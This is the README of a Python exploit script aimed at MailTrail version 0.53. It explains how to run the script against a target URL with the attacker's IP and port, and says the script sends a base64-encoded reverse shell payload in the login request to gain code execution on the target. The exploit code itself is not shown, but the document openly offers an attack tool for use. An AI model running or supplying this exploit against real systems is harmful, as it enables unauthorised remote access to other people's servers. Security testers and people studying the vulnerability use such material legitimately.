# MailTrail Exploit

This Python script is designed to exploit a vulnerability in MailTrail version 0.53. It allows an attacker to execute arbitrary code on the target system. This script constructs a payload to trigger the vulnerability and deliver a reverse shell.

## Usage

Ensure you have Python 3 installed. You can use this script by providing the following command-line arguments:

python3 mailtrail.py <your_ip> <your_port> <target_url>


- `<your_ip>`: Your IP address where the reverse shell should connect.
- `<your_port>`: The port number for the reverse shell.
- `<target_url>`: The URL of the target MailTrail application.

### Example Usage:

python3 mailtrail.py 192.168.1.10 4444 http://target-mailtrail-url.com


## How It Works

The script constructs a reverse shell payload using Python 3, encodes it with base64, and sends it to the target URL as part of the login request. If the target system is vulnerable, this payload is executed, leading to a reverse shell connection back to your machine.
